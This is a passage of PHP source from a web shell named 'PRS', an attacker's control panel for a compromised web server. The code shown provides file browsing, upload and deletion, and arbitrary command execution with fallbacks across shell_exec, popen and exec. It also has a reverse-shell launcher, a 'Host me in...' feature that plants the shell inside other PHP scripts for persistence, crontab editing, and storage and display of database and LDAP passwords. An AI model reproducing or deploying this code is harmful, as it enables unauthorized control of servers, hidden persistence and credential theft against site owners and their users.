            <input type=hidden name='choice[]' value=\"%s\">
            <p>%s<pre>%s</pre>
            <p>&gt; If you think this file is a ASCII file and can be viewed, 
            <input type=button 
            onclick=\"is_nav.value=1;force_view.value=1;_submit()\" 
            class=button value=\"Click here\"> to view its content.",
      	    $this->htmlentities ($this->vars['dir_current']),
      	    (strpos ($tmp, ' empty') !== false) ?
      	      "This is a empty file&nbsp;:" :
      	      "You can not view this file content ($tmp)&nbsp;:",
      	    "$filename $filesize");
        }
        else
        {
          $this->vars['command_current_output'] = 
            $this->read_file ($this->vars['dir_current']);

          $can_save = $can_write;

          echo "
            <input type=hidden name='choice[]' value=\"".$this->htmlentities ($this->vars['dir_current'])."\">
            <pre>".$this->htmlentities("$filename $filesize")."</pre>";

          if ($this->vars['action_type'] == ACTION_MENU_HOSTME)
          {
            $f = substr ($_SERVER['SCRIPT_URI'], 0, strrpos($_SERVER['SCRIPT_URI'], '/')).substr($this->vars['dir_current'], strlen($_SERVER['DOCUMENT_ROOT'])-1);
            echo "<p><b>PRS has been hosted inside this file. To restore <i>".substr($_SERVER['PHP_SELF'], 1)."</i> if someone ever erased it, first go to <a href='".$f."' target=_blank>".$f.'</a>, then launch PRS using the <i>launcher.html</i> file as usual&nbsp;:-)</b></p>';
          }

          echo "<textarea name=file_content class=ffixe>".$this->vars['command_current_output']."</textarea>";
        }

        echo "</div>";
      }
      // DIRECTORY
      else
      {
        if (substr ($this->vars['dir_current'], -1) != '/')
        {
          $this->vars['dir_current'] .= '/';
        }

        if ($this->vars['dir_current']{0} != '/')
        {
          $this->vars['dir_current'] = '/'.$this->vars['dir_current'];
        }

        if (!$retry)
        {
          list ($browse_path, $html) = $this->get_browse_path ();
          echo "<p>$html</p>";
        }

        $this->vars['command_current_output'] = '';

        if (!is_dir ($this->vars['dir_current']))
        {
          $this->vars['dir_current'] = (ini_get ('open_basedir')) ?
           $this->get_first_open_basedir () : $this->get_root_path ();
        }

      	echo "<table class=file_browser>
          <tr>
          <th>&nbsp;</th>
          <th>Rights</th>
          <th>User</th>
          <th>Group</th>
          <th>Size</th>
          <th>Date</th>
          <th>Time</th>
          <th>Name</th></tr>\n";

        $dir_content = $this->get_dir_content ($this->vars['dir_current']);
        $row_color = '';
        foreach (explode ("\n", $dir_content) as $l)
        {
          $arr = $this->get_file_data_from_line ($l);
          if (!$arr ||
              !isset ($arr[8]))
          {
            continue;
          }

         // Check wether to display or not the current file
         if (!$this->is_display_file ($arr))
         {
           continue;
         }

         $file_path = $this->vars['dir_current'].$arr[8];

      	  if (!$can_upload && $arr[8] == ".")
          {
     	    $can_upload = (is_writable ($file_path) ||
                           $this->can_write_owner_file ($arr[0]));
          }

      	  if (!empty ($arr[8]))
      	  {
            if ($this->is_symlink ($arr[0]))
            {
              list ($file_path, $real_fpath) =
                preg_split('/\s*\->\s*/', $file_path);

              if ($real_fpath{0} != '/')
              {
                $real_fpath =
                  $this->normalize_path ("$browse_path/$real_fpath");
              }
            }
            else
            {
              $real_fpath = $file_path;
            }

            // Rights
      	    if (is_writable ($real_fpath) && 
      	        !$this->is_symlink ($arr[0]) &&
                !$this->is_socket ($arr[0]))
            {
    	      $class_color = 'rights_write';
              $can_write_some = 1;

              if ($this->is_php_script ($arr[8]))
              {
                $can_host_some = 1;
              }
            }
      	    elseif (is_readable ($real_fpath))
            {
      	      $class_color = 'rights_read';
            }
      	    else
            {
      	      $class_color = 'rights_bad';
            }

            // Type
            $value = $arr[8];
            if ($this->is_directory ($arr[0]))
            {
              $class_link = 'file_browser_directory';
              $value = "$arr[8]/";
            }
            elseif ($this->is_symlink ($arr[0]))
            {
              $class_link = 'file_browser_symlink';
            }
            else
            {
              $class_link = 'file_browser_file';
            }

      	    $row_color = ($row_color == 'odd') ? 'even' : 'odd';
            echo "<tr class=$row_color><td width='1%' class=$class_color>";

      	    if ($class_color != 'rights_bad' && 
    	        $arr[8] != '.' && $arr[8] != '..')
            {
      	      echo "
                <input type=checkbox 
                       name=\"choice[]\" 
                       value=\"".$this->htmlentities($file_path)."\">";
            }
      	    else
            {
      	      echo '&nbsp;';
            }

      	    echo "
              </td>
              <td width='11%' nowrap>$arr[0]</td>
              <td width='11%' nowrap>$arr[2]</td>
              <td width='11%' nowrap>$arr[3]</td>
              <td width='11%' nowrap>$arr[4]</td>
              <td width='11%' nowrap>$arr[5]</td>
              <td width='11%' nowrap>$arr[6]</td>
              <td width='32%' nowrap class=name>";

            if ($class_color != "rights_bad" &&
                !$this->is_socket ($arr[0]))
            {
    	       echo " 
                 <input type=button class=$class_link 
                 onclick=\"is_nav.value=1;file_current_rights.value='".
                 "$arr[2],$arr[3],$arr[0]"."';dir_current.value='".
                 addslashes($this->htmlentities($file_path)).
                 "';_submit()\" value=\"".
                 $this->htmlentities($value)."\"></td></tr>";
            }
            else
            {
              echo $this->htmlentities ($value);
            }
          }
        }

        echo '</table>';
      }

      if ($this->vars['force_save'])
      {
        $can_save = 1;
      }

      if ($this->vars['force_delete'])
      {
        $can_write_some = 1;
      }

      if (is_file ($this->vars['dir_current']))
      {
        if (!$can_save)
        {
          echo "  
            <p>&gt; If you think this file can be saved, 
            <input type=button 
            onclick=\"is_nav.value=1;force_save.value=1;_submit()\" 
            class=button value=\"Click here\"> 
            to activate the \"Save\" button.";
        }

        if (!$can_write_some)
        {
          echo "  
            <p>&gt; If you think this file can be deleted,
            <input type=button 
            onclick=\"is_nav.value=1;force_delete.value=1;_submit()\" 
            class=button value=\"Click here\"> 
            to activate the \"Delete\" button.";
        }
      }

      echo "<p><table class=file_browser_menu><tr>";

      // Download
      if ($this->normal_download_ok () || 
          is_file ($this->vars['dir_current']))
      {
        echo " 
          <td><input ".(($can_read) ? "" : " class=\"disabled\" disabled"). 
          " type=button onclick=\"dir_current.value='".
          addslashes($this->htmlentities ($this->vars['dir_current'])). 
          "';action_type.value='".ACTION_MENU_DOWNLOAD.
          "';_submit();\" value='Download' ".
          "title=\"Download current file or selected items\"></td>";
      }

      if (!is_file ($this->vars['dir_current']))
      {
        // Upload
        echo "
          <td><input type=file name=upload_file ".
          (($can_upload) ? "" : " class=\"disabled\" disabled")."><br>
          <input ".(($can_upload) ? '' : " class=\"disabled\" disabled ").
          " type=button onclick=\"dir_current.value='".
          addslashes($this->htmlentities ($this->vars['dir_current'])).
          "';action_type.value='".ACTION_MENU_UPLOAD.
          "';_submit();\" value='Upload' ".
          "title=\"Upload a file in the current location\"></td>";
        // Create directory
        echo "
          <td><input ".(($can_upload) ? '' : " class=\"disabled\" disabled").
          " type=text name=mkdir_name value=\"\"><br>".
          "<input ".(($can_upload) ? '' : " class=\"disabled\" disabled").
          " type=button onclick=\"dir_current.value='".
          addslashes ($this->htmlentities ($this->vars['dir_current'])).
          "';action_type.value='".ACTION_MENU_MKDIR.
          "';_submit();\" value='Create directory' ".
          "title=\"Create a new directory in the current location\"></td>";
        // Bookmark
        echo "
          <td><input type=button title=\"Bookmark the current location\" 
          value='Bookmark' onclick=\"if (document.getElementById ('bookmarks_box').style.visibility == 'hidden') show_hide('bookmarks', forms[0].bookmarks_cb);dir_current.value='".
          addslashes($this->htmlentities ($this->vars['dir_current'])).
          "';action_type.value='".ACTION_MENU_BOOKMARK.
          "';_submit()\"></td>";
      }
      else
      {
        // Save file
        echo "
          <td><input ".(($can_save) ? '' : " class=\"disabled\" disabled").
          " type=button onclick=\"dir_current.value='".
          addslashes ($this->htmlentities ($this->vars['dir_current'])).
          "';action_type.value='".ACTION_MENU_SAVE.
          "';_submit();\" value='Save' ".
          "title=\"Save the current file\"></td>";
      }

      // Delete
      echo "
        <td><input ".(($can_write_some) ? 
          '' : " class=\"disabled\" disabled").
        " type=button onclick=\"dir_current.value='".
        addslashes ($this->htmlentities ($this->vars['dir_current'])).
        "';action_type.value='".ACTION_MENU_DELETE.
        "';_submit();\" value='Delete' ".
        "title=\"Delete current file or selected items\"></td>";

      // Host me
      echo "
        <td><input ".(($can_host_some) ? 
          '' : " class=\"disabled\" disabled").
        " type=button onclick=\"dir_current.value='".
        addslashes ($this->htmlentities ($this->vars['dir_current'])).
        "';action_type.value='".ACTION_MENU_HOSTME.
        "';_submit();\" value='Host me in...' ".
        "title=\"Host PRS in another PHP script to restore ".
        "it later. Think twice!\"></td>";

      echo "</tr></table>";
    }

    function is_symlink ($rights)
    {
      return ($rights{0} == 'l');
    }

    function is_socket ($rights)
    {
      return ($rights{0} == 's');
    }

    function can_change_file_timestamp ($user, $group, $rights)
    {
      return ($rights[2] == 'w' && $this->vars['www_user'] == $user);
    }

    function can_write_owner_file ($rights)
    {
      return ($rights == 'drwxrwxrwt');
    }

    function is_normal ($data)
    {
      return (!$this->is_directory ($data[0]) &&
              !$this->is_symlink ($data[0]) &&
              !$this->is_hidden ($data[8]) &&
              !$this->is_device ($data[0]));
    }

    function is_hidden ($name)
    {
      return ($name{0} == '.');
    }

    function is_directory ($rights)
    {
      return ($rights && $rights[0] == 'd');
    }

    function is_device ($rights)
    {
      return ($rights && ($rights[0] == 'b' || $rights[0] == 'c'));
    }

    function get_bookmarks ()
    {
      return implode (':', $this->vars['bookmarks']);
    }

    function get_envpath ()
    {
      return implode (':', $this->vars['envpath']);
    }

    function create_tmpfile ()
    {
      $filename = $this->get_base_tmpdir().'/.'.md5(microtime());
      $ret = '';

      if (($h = fopen ($filename, 'w')))
      {
        $ret = $filename;
        fclose ($h);
      }

      return $ret;
    }

    function get_base_tmpdir ()
    {
      $tmpdir = getenv ('TMPDIR');
      $current = getenv ('PWD');

      if (!$tmpdir)
      {
        $tmpdir = '/tmp';
      }
 
      $n = "$tmpdir/.0";
      if ($this->write_file ($n, 1, 'w'))
      {
        chmod ($n, 0666);
        unlink ($n);
        return "$tmpdir";
      }

      if ($current)
      {
        $n = "$current/tmp/.0";
        if ($this->write_file ($n, 1, 'w'))
        {
          chmod ($n, 0666);
          unlink ($n);
          return "$current/tmp";
        }

        $n = "$current/.0";
        if ($this->write_file ($n, 1, 'w'))
        {
          chmod ($n, 0666);
          unlink ($n);
          return $current;
        }
      }
       
      $current = dirname ($_SERVER['SCRIPT_FILENAME']);
      $n = "$current/.0";
      if ($this->write_file ($n, 1, 'w'))
      {
        chmod ($n, 0666);
        unlink ($n);
        return $current;
      }
    }

    function create_tmpdir ()
    {
      $dirname = $this->get_base_tmpdir().'/.'.md5(microtime());
      if (mkdir ($dirname))
      {
        chmod ($dirname, 0777);
        return $dirname;
      }

      $dirname = basename ($dirname);
      if (mkdir ($dirname))
      {
       chmod ($dirname, 0777);
       return $dirname;
      }
    }

    function command_current_execute ($env = array ())
    {
      $ok = 0;
      $exec_func = '';
      $can_exec = $this->execute_enabled ();
      $this->vars['command_current_output'] = '';

      foreach ($env as $k => $v)
      {
        putenv ("$k=$v");
      }

      $path_old = getenv ('PATH');
      if (($path_new = $this->get_envpath ()))
      {
        putenv ("PATH=$path_new");
      }

      // 1 - First, try shell_exec
      if ($can_exec)
      {
        $exec_func = $this->get_execute_function ();

        if ($exec_func == 'shell_exec')
        {
          $this->vars['command_current_output'] = 
            shell_exec ($this->vars['command_current'] . " 2>&1");
          $ok = 1;
        }
      }

      // 2 - Then popen*
      if (!$ok &&
          ($p = $this->openp ($this->vars['command_current']. " 2>&1", $pipe)))
      {
        while (!feof($pipe))
        {
          $this->vars['command_current_output'] .= fread ($pipe, 1024);
        }
        $this->closep ($p, $pipe);
      }
     // 3 - Then other exec* functions
      elseif (!$ok && 
              $can_exec && 
              (($tmpdir = $this->create_tmpdir ())) &&
              ($fifo = tempnam ($tmpdir, '.')))
      {
        $exec_func ('('.$this->vars['command_current'] . ') '." > $fifo 2>&1");
        if (!($fd = fopen ($fifo, 'r')))
        {
          unlink ($fifo);
          rmdir ($tmpdir);
          return;
        }
        while (1)
        {
          $out = fread ($fd, 1);
          if (!strlen ($out))
          {
            break;
          }
          $this->vars['command_current_output'] .= $out;
        }
        fclose ($fd);
        unlink ($fifo);
        rmdir ($tmpdir);
      }

      if ($path_old)
      {
        putenv ("PATH=$path_old");
      }

      $this->vars['command_current_output'] =
        $this->fix_magic_quotes ($this->vars['command_current_output']);
    }

    function sql_command_current_execute ()
    {
      $this->vars['sql_command_current_output'] = '';

      if (!$this->sql_connection_test ())
        return;

      $cmd = $this->cmd_replace_sql_client_commands (
        $this->vars['sql_command_current']);
      $this->vars['sql_command_current_output'] =
        $this->fix_magic_quotes ($this->sql_query ($cmd));
    }

    function get_box_posX ($name)
    {
      return $this->vars[$name.'_box_x'];
    }

    function get_box_posY ($name)
    {
      return $this->vars[$name.'_box_y'];
    }

    function display_reverse_shell_html ()
    {
      $public_access = 0;
      $ips = array ();

      if (($this->check_shell_command ('ip') &&
               ($r = $this->execute_command_safe ('ip -4 a')) ||
             $this->check_shell_command ('ifconfig') &&
               ($r = $this->execute_command_safe ('ifconfig'))) &&
                 preg_match_all ('/inet\s+([0-9\.]+)/i', $r, $m))
      {
        $public_ip = $this->php_function_enabled ('gethostbyname') ?
          gethostbyname ($_SERVER['HTTP_HOST']) : $_SERVER['HTTP_HOST'];
        foreach ($m[1] as $ip)
        {
          if (!preg_match ('/^127/', $ip))
          {
            array_push ($ips, $ip);

            if ($ip == $public_ip)
            {
              $public_access = 1;
            }
          }
        }
      }

      if (!$this->vars['rs_ip'])
      {
        $this->vars['rs_ip'] = $_SERVER['SERVER_ADDR'];
      }
  
      if (count ($ips))
      {
        echo "<p><b>You can either&nbsp;:</b></p>";

        echo "<p>Start a TCP/IP reverse shell on ";
        echo "<select name=rs_ip>";
        foreach ($ips as $ip)
        {
          echo
            "<option value='$ip'".
              (($ip == $this->vars['rs_ip'])?' selected="selected"':'').
            ">$ip</option>";
        }
        echo "</select>";
        echo ":";
        echo "<input type=text name=rs_port value='".
          (($this->vars['rs_port'])?$this->vars['rs_port']:4000)."' size=5/>" ;
        if (!$public_access)
        {
          echo "<p><i>The public IP ($public_ip) of the remote host is not registred on its interfaces&nbsp;!</i></p>";
        }
        echo "<p><input type=button onclick=\"
        document.forms[0].target='_blank';display_type.value='".SHELL_EXECUTE_REVERSE."';
        _submit()\" value='Start reverse shell'></p>";

        echo "<p><b>or&nbsp;:</b></p>";
      }
    }

    function display_history_html ()
    {
      echo "
        <table>
        <caption>History</caption>
        <tr><td colspan=2><input type=button value='Reset history'
        onclick=\"action_requested.value='".SHELL_HISTORY_RESET.
        "';_submit()\"></td></tr>
        <tr class=header><th colspan=2>Command</th><th>Action</th></tr>";

      $i = 0;
      foreach ($this->vars['history'] as $row)
      {
        echo "
          <tr><td class=num>".($i + 1)."</td>
          <td nowrap>".$this->htmlentities($row)."</td>
          <td nowrap><input type=button title=\"Execute\" value='E' 
          onclick=\"history_index.value=$i;action_requested.value='".
          SHELL_HISTORY_EXECUTE."';_submit()\">
          <input type=button title=\"Select\" value='S'
          onclick=\"command.value='".
          addslashes($this->htmlentities ($row))."'\">
          <input type=button title=\"Delete\" value='D'
          onclick=\"history_index.value=$i;action_requested.value='".
          SHELL_HISTORY_DELETE."';_submit()\"></td></tr>";
        $i++;
      }

      echo "</table>";
    }
    
    function display_sql_history_html ()
    {
      echo "
        <table>
        <caption>SQL history</caption>
        <tr><td colspan=2><input type=button value='Reset history' 
        onclick=\"action_requested.value='".SHELL_SQL_HISTORY_RESET.
        "';_submit()\"></td></tr>
        <tr class=header><th colspan=2>Command</th><th>Action</th></tr>";

      $i = 0;
      foreach ($this->vars['sql_history'] as $row)
      {
        echo "
          <tr><td class=num>".($i + 1)."</td>
          <td>".$this->htmlentities ($row)."</td>
          <td nowrap><input type=button title=\"Execute\" value='E'
          onclick=\"sql_history_index.value=$i;action_requested.value='".
          SHELL_SQL_HISTORY_EXECUTE."';_submit()\">
          <input type=button title=\"Select\" value='S'
          onclick=\"sql_command.value='".
          addslashes ($this->htmlentities ($row))."'\">
          <input type=button title=\"Delete\" value='D'
          onclick=\"sql_history_index.value=$i;action_requested.value='".
          SHELL_SQL_HISTORY_DELETE."';_submit()\"></td></tr>";
        $i++;
      }

      echo "</table>";
    }

    function display_bookmarks_html ()
    {
      echo "
        <div id=bookmarks_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY('bookmarks').
        ";left: ".$this->get_box_posX('bookmarks').";visibility: ".
        $this->get_show_hide('bookmarks')." ;\">
        <table>
        <tr><th colspan=2 
        onMouseOver=\"this.style.cursor='move';\"
        onMouseDown=\"drag_begin('bookmarks_box')\" 
        onMouseUp=\"drag_end()\" 
        class=caption>Directory location bookmarks</th>
        <th class=win_close
        onclick=\"show_hide('bookmarks', forms[0].bookmarks_cb)\">X</th></tr>
        <tr class=header><th colspan=2>Directory</th><th>Action</th></tr>";

      $i = 0;
      foreach ($this->vars['bookmarks'] as $row)
      {
        echo "
          <tr><td class=num>".($i + 1)."</td>
          <td nowrap>".$this->htmlentities ($row)."</td><td nowrap>
          <input type=button title=\"Go to this directory\" value='Go' 
          onclick=\"bookmarks_index.value=$i;action_requested.value='".
          SHELL_BOOKMARKS_GO."';_submit()\"> 
          <input type=button value='Delete' 
          onclick=\"bookmarks_index.value=$i; action_requested.value='".
          SHELL_BOOKMARKS_DELETE."';_submit()\"></td></tr>";
        $i++;
      }

      echo "</table></div>";
    }

    function display_envpath_html ()
    {
      echo "
        <div id=envpath_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY('envpath').
        ";left: ".$this->get_box_posX('envpath').";visibility: ".
        $this->get_show_hide('envpath')." ;\">
        <table>
        <tr><th colspan=2 
        onMouseOver=\"this.style.cursor='move';\"
        onMouseDown=\"drag_begin('envpath_box')\" 
        onMouseUp=\"drag_end()\" 
        class=caption>Environment PATH</th>
        <th class=win_close
        onclick=\"show_hide('envpath', forms[0].envpath_cb)\">X</th></tr>
        <tr class=header><th colspan=2>Directory</th><th>Action</th></tr>
        <tr><td colspan=2><input type=text name=envpath_value value=\"\">
        </td>
        <td>
        <input type=button value='Add' 
        onclick=\"action_requested.value='".SHELL_ENVPATH_ADD.
        "';_submit()\"></td></tr>";

      $i = 0;
      foreach ($this->vars['envpath'] as $row)
      {
        echo "
          <tr>
          <td class=num>".($i + 1)."</td>
          <td nowrap>".$this->htmlentities($row)."</td>
          <td nowrap>
          <input type=button value='Delete' onclick=\"envpath_index.value=$i;
          action_requested.value='".SHELL_ENVPATH_DELETE."';_submit()\">
          </td></tr>";
        $i++;
      }

      echo "</table></div>";
    }

    function display_file_browser_initpath_html ()
    {
      echo "
        <div id=initpath_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY('initpath').
        ";left: ".$this->get_box_posX ('initpath').";visibility: ".
        $this->get_show_hide('initpath')." ;\">
        <table>
        <tr>
        <th onMouseOver=\"this.style.cursor='move'\"
        onMouseDown=\"drag_begin('initpath_box')\" onMouseUp=\"drag_end()\" 
        class=caption>Initial Path</th>
        <th class=win_close 
        onclick=\"show_hide('initpath', forms[0].initpath_cb)\">X</th></tr>
        <tr class=header><th>Path</th><th>Action</th></tr>
        <tr><td><input type=text name=initpath_value value=\"".
        $this->htmlentities($this->vars['file_browser_initpath'])."\"></td>
        <td><input type=button value='Update' 
        onclick=\"dir_current.value='".
        addslashes ($this->htmlentities($this->vars['dir_current'])).
        "';file_browser_initpath.value=initpath_value.value;_submit()\">
        </td></tr></table></div>";
    }

    function display_highlight_html ()
    {
      echo "
        <div id=highlight_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY('highlight').
        ";left: ".$this->get_box_posX('highlight').";visibility: ".
        $this->get_show_hide('highlight')." ;\">
        <table>
        <tr>
        <th onMouseOver=\"this.style.cursor='move'\"
        onMouseDown=\"drag_begin('highlight_box')\" onMouseUp=\"drag_end()\" 
        class=caption>PHP Code highlight</th><th class=win_close 
        onclick=\"show_hide('highlight', forms[0].highlight_cb)\">X</th></tr>
        <tr><td colspan=2>".
        highlight_string("<?php\n".$this->vars['phpcode_current']."\n?>", 1)."
        </td></tr></table></div>";
    }

    function display_crontab_html ()
    {
       $output = ($this->vars['crontab_data']) ?
         $this->vars['crontab_data'] :
         $this->execute_command_safe ('crontab -l');

       if (preg_match ('/^\s*no\s+crontab/i', $output))
       {
         echo "<p style='color:gray;margin-bottom:10px'>".
              ucfirst($output).'</p>';
         $output = "# Syntax: m h d M D cmd\n\n";
       }

       echo "<textarea name=crontab_data class=ffixe>".
             $this->htmlentities($output).
             "</textarea>";

       echo " 
          <p><table class=file_browser_menu><tr>
          <td><input type=button onclick=\"action_type.value='".
          ACTION_MENU_CRONTAB_SAVE."';_submit();\" value='Save'></td>
          <td><input type=button onclick=\"action_type.value='".
          ACTION_MENU_CRONTAB_REMOVE."';_submit();\" value='Remove'></td>
          </tr></table>";
    }

    function display_profiles_html ()
    {
      echo "
        <div id=profiles_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY('profiles').
        ";left: ".$this->get_box_posX('profiles').";visibility: ".
        $this->get_show_hide('profiles')." ;\">
        <table>
        <tr><th onMouseOver=\"this.style.cursor='move'\"
        onMouseDown=\"drag_begin('profiles_box')\" 
        onMouseUp=\"drag_end()\" 
        colspan=2 class=caption>Profiles management</th>
        <th class=win_close 
        onclick=\"show_hide('profiles', forms[0].profiles_cb)\">X</th></tr>
        <tr class=header><th colspan=2>Name</th><th>Action</th></tr>";

      if (count ($this->vars['profiles']) < EDIT_MAX)
        echo "
        <tr><td colspan=2>
        <input type=text maxlength=50 name=profile_name value=\"\">
        </td>
        <td colspan=2>
        <input type=button value='Save' 
        onclick=\"action_requested.value='" . EDIT_PROFILES_SAVE .
        "';_submit()\"></td></tr>";

      $i = 0;
      foreach ($this->vars['profiles'] as $name)
      {
        echo "
          <tr>
          <td class=num>".($i + 1)."</td>
          <td>".$this->htmlentities ($name)."</td>
          <td nowrap>
          <input type=button title=\"Load\" value='L' 
          onclick=\"profiles_index.value=$i;profile_current.value='".
          addslashes($this->htmlentities($name)).
          "';action_requested.value='".
          EDIT_PROFILES_LOAD ."';_submit()\">
          <input type=button
          title=\"Update/Replace with current\" value='U'
          onclick=\"profiles_index.value=$i;action_requested.value='".
          EDIT_PROFILES_UPDATE ."';_submit()\">
          <input type=button title=\"Delete\" value='D'
          onclick=\"profiles_index.value=$i;action_requested.value='".
          EDIT_PROFILES_DELETE ."';_submit()\"></td></tr>";
        $i++;
      }

      echo "</table></div>";
    }

    function display_sql_html ($type)
    {
      switch ($type)
      {
        case SQL_POSTGRESQL:
          $notavailable = (!extension_loaded ('pdo_pgsql') &&
                           !$this->php_function_enabled ('pg_connect'));
          break;

        case SQL_LDAP:
          $notavailable = !$this->php_function_enabled ('ldap_connect');
          break;

        case SQL_MYSQL:
          $notavailable = (!extension_loaded ('pdo_mysql') &&
                           !$this->php_function_enabled ('mysqli_connect') &&
                           !$this->php_function_enabled ('mysql_connect'));
      }

      $login_lb = ($type == SQL_LDAP) ? 'Login (DN)' : 'Login';
      $database_lb = ($type == SQL_LDAP) ? 'Base DN' : 'Database';

      echo "
        <div id=".$type."s_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY($type.'s').
        ";left: ".$this->get_box_posX($type.'s').";visibility: ".
        $this->get_show_hide($type.'s')." ;\">";

        if ($notavailable)
        {
          echo
            "<span class=error>No PHP $type support on this server!</span><p/>";
        }

      if ($type == SQL_LDAP)
      {
        echo "<input type=hidden name='$type' value=''>";
      }

      echo "
        <table>
        <tr><th onMouseOver=\"this.style.cursor='move'\"
        onMouseDown=\"drag_begin('".$type."s_box')\" 
        onMouseUp=\"drag_end()\" 
        colspan=6 class=caption>".$type." databases management</th>
        <th class=win_close 
        onclick=\"show_hide('".$type."s', forms[0].".$type."s_cb)\">X</th></tr>
        <tr class=header><th colspan=2>Server</th><th>Port</th>
        <th>$database_lb</th>
        <th>$login_lb</th><th>Password</th><th>Action</th></tr>";

      if (count ($this->vars[$type.'s']) < EDIT_MAX)
      {
        echo "
        <tr>
        <td colspan=2><input type=text size=20 name='".$type.
        "_server' value=\"\"></td>
        <td><input type=text size=5 name='".$type."_port' value=\"\"></td>";
      }

      echo
          "<td><input type=text size=20 name='".$type.
          "_database' value=''></td>
          <td><input type=text size=10 name='".$type."_login' value=\"\"></td>
          <td><input type=text size=10 name='".$type."_password' value=\"\">
          </td>";

      echo ($notavailable) ?
        "<td><input type=button value='Save' 
         onclick=\"alert('Not available on this server!')\"></td></tr>"
        :
        "<td><input type=button value='Save' 
         onclick=\"sql_type.value='".$type."';action_requested.value='".
         EDIT_SQL_SAVE ."';_submit()\"></td></tr>";

      if (!$notavailable)
      {
        $i = 0;
        foreach ($this->vars[$type.'s'] as $k => $v)
        {
          echo "
            <tr>
            <td class=num>".($i + 1)."</td>
            <td>".$this->htmlentities($v['server'])."</td>
            <td>".$this->htmlentities($v['port'])."</td>
            <td>".$this->htmlentities($v['database'])."</td>
            <td>".$this->htmlentities($v['login'])."</td>
            <td>".$this->htmlentities($v['password'])."</td>
            <td nowrap>
            <input type=button title=\"Load\" value='L' 
            onclick=\"".$type."s_index.value='" . 
            addslashes($this->htmlentities($k))."';sql_current.value='".
            addslashes ($this->htmlentities($k)).
            "';sql_type.value='".$type."';action_requested.value='".
            EDIT_SQL_LOAD."';_submit()\">
            <input type=button title=\"Delete\" value='D'
            onclick=\"".$type."s_index.value='".
            addslashes($this->htmlentities($k))."';
            sql_type.value='".$type."';action_requested.value='".
            EDIT_SQL_DELETE."';_submit()\"></td></tr>";
          $i++;
        }
      }

      echo "</table></div>";
    }

    function display_aliases_html ()
    {
      echo "
        <div id=aliases_box class=box
        onclick=\"this.style.zIndex=++zIndex;\"
        style=\"top: ".$this->get_box_posY('aliases').
        ";left: ".$this->get_box_posX ('aliases').";visibility: ".
        $this->get_show_hide('aliases')." ;\">
        <table>
        <tr><th onMouseOver=\"this.style.cursor='move'\"
        onMouseDown=\"drag_begin('aliases_box')\" 
        onMouseUp=\"drag_end()\" 
        colspan=3 class=caption>Aliases</th>
        <th class=win_close 
        onclick=\"show_hide('aliases', forms[0].aliases_cb)\">X</th></tr>
        <tr class=header><th colspan=2>Name</th><th>Value</th><th>Action</th>
        </tr>
        <tr><td colspan=2><input size=5 type=text 
        name=alias_name value=\"\"></td>
        <td><input type=text name=alias_value value=\"\"></td>
        <td>
        <input type=button value='Add' 
        onclick=\"action_requested.value='".SHELL_ALIASES_ADD.
        "';_submit()\"></td></tr>";

      $i = 0;
      foreach ($this->vars['aliases'] as $name => $value)
      {
        echo "
          <tr>
          <td class=num>".($i + 1)."</td>
          <td><b>\$".$this->htmlentities ($name)."</b></td>
          <td>".$this->htmlentities ($value)."</td>
          <td>
          <input type=button value='Delete' onclick=\"alias_name.value='".
          addslashes ($this->htmlentities($name)).
          "';action_requested.value='".
          SHELL_ALIASES_DELETE."';_submit()\"></td></tr>";
        $i++;
      }

      echo "</table></div>";
    }

    function get_input_hidden_html ($name, $value)
    {
      return 
        "<input type=hidden name=$name value=\"" . 
        $this->htmlentities ($value) . "\">\n";
    }

    function get_http_var ($name, $default = '')
    {
      $tmp = '';

      if (isset ($_POST[$name]))
      {
        $tmp = $_POST[$name];
      }

      return (empty ($tmp)) ? $tmp = $default : $this->fix_magic_quotes ($tmp);
    }

    function is_assoc_array ($array)
    {
      if (is_array ($array) && !empty ($array))
      {
        for ($i = count ($array) - 1; $i; $i--)
        {
          if (!array_key_exists ($i, $array))
          {
            return 1;
          }
        }

        return !array_key_exists (0, $array);
      }
    }

    function fix_magic_quotes ($str, $runtime = 0)
    {
      $filter = ($runtime) ? 
        ini_get ('magic_quotes_runtime') == 1 : 
        ini_get ('magic_quotes_gpc') == 1;

      if ($filter)
      {
        if (is_array ($str))
        {
          if ($this->is_assoc_array ($str))
          {
            foreach ($str as $k => $v)
            {
              $str[$k] = $this->fix_magic_quotes ($v);
            }
          }
          else
          {
            for ($i = 0; $i < count ($str); $i++)
            {
              $str[$i] = $this->fix_magic_quotes ($str[$i]);
            }
          }
        }
        else
        {
          $str = stripslashes ($str);
        }
      }

      return $str;
    }

    function utf8_decode ($str)
    {
      return (preg_match ('/./u', $str)) ? utf8_decode ($str) : $str;
    }

    function utf8_encode ($str)
    {
      return (preg_match ('/./u', $str)) ? $str : utf8_encode ($str);
    }

    function htmlentities ($str)
    {
      return htmlspecialchars ($str);
    }

    function escapeshellarg ($str)
    {
      $old = setlocale (LC_CTYPE, 0);

      setlocale (LC_CTYPE, 'en_US.UTF-8');
      $ret = escapeshellarg ($str);
      setlocale (LC_CTYPE, $old);

      return $ret;
    }

    function is_htmloutput ()
    {
      return ($this->vars['htmloutput'] != '');
    }

    function get_htmloutput_html ()
    {
      return "
        <p><input type=checkbox name=htmloutput id=htmloutput 
        title='This option can bother application look&amp;feel'> 
        <label for=htmloutput>HMTL output expected</label>";
    }

    function get_infosbar_html ()
    {
      $output = '';
      $warning = '';
      $open_basedir = '';
      $encrypted = '';

      if (ini_get ('safe_mode'))
      {
        $warning = $this->get_safe_mode_alert_html ('some').'<p>';
        if (($d = ini_get ('safe_mode_exec_dir')))
          $warning .= "
            .Safe mode exec directory : 
            <span class=info_value>$d</span><br>";
      }
      elseif (!$this->execute_enabled ())
      {
        $warning = $this->get_php_function_alert_html ('some').'<p>';
      }

      if (($d = ini_get ('open_basedir')))
      {
        $open_basedir = "
          .Open basedir restriction :
          <span class=info_value>$d</span><br>";
      }

      if ($this->vars['cryptkey'] != '')
      {
        $encrypted = "
          .PRS encrypted file :
          <span class=info_value>yes</span><br>";
      }

      return sprintf("
        <div id=profile_title>
          <div>
            $warning
            $open_basedir
            $encrypted
            .Storage method : <span>%s</span><br>
            .Exec method : %s<br>
